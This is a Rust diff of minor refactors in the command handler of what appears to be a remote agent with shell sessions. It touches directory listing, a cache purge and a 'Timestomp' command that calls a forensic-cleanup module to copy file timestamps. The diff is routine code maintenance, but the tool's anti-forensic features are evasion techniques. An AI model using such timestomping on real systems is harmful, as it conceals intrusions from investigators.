@@ -309,7 +309,10 @@ pub async fn handle_command(
         Command::ListDirectory { ref path } => {
             let cfg = config.lock().await.clone();
             match fsops::list_directory(path, &cfg).await {
-                Ok(entries) => Ok(serde_json::to_string(&entries).unwrap_or_default()),
+                Ok(entries) => {
+                    serde_json::to_string(&entries)
+                        .map_err(|e| format!("list_directory serialization failed: {e}"))
+                }
                 Err(e) => Err(e.to_string()),
             }
         }
@@ -1989,7 +1992,7 @@ pub async fn handle_command(
                 }
                 .map(|_| "Timestomp complete".to_string())
             } else {
-                let reference_nt = to_nt_wide(&reference_file);
+                let reference_nt = to_nt_wide(reference_file.trim());
                 unsafe {
                     crate::forensic_cleanup::timestamps::sync_timestamps(&file_nt, &reference_nt)
                 }
@@ -3099,10 +3102,8 @@ fn handle_run_approved_script(name: &str) -> Result<String, String> {
             let mut purged: usize = 0;
             let read_dir = std::fs::read_dir(cache_dir).map_err(|e| format!("read_dir: {e}"))?;
             for entry in read_dir.flatten() {
-                if entry.path().is_file() {
-                    if std::fs::remove_file(entry.path()).is_ok() {
-                        purged += 1;
-                    }
+                if entry.path().is_file() && std::fs::remove_file(entry.path()).is_ok() {
+                    purged += 1;
                 }
             }
             Ok(serde_json::json!({ "purged": purged }).to_string())
@@ -3314,16 +3315,14 @@ mod tests {
         // Drain any ShellOutput messages that arrived.
         while let Ok(msg) = out_rx.try_recv() {
             // Just verify they're the right type.
-            match msg {
-                Message::ShellOutput {
-                    session_id: sid,
-                    data,
-                    ..
-                } => {
-                    assert_eq!(sid, session_id, "ShellOutput should reference our session");
-                    let _ = data; // don't care about content for lifecycle test
-                }
-                _ => {}
+            if let Message::ShellOutput {
+                session_id: sid,
+                data,
+                ..
+            } = msg
+            {
+                assert_eq!(sid, session_id, "ShellOutput should reference our session");
+                let _ = data; // don't care about content for lifecycle test
             }
         }
 
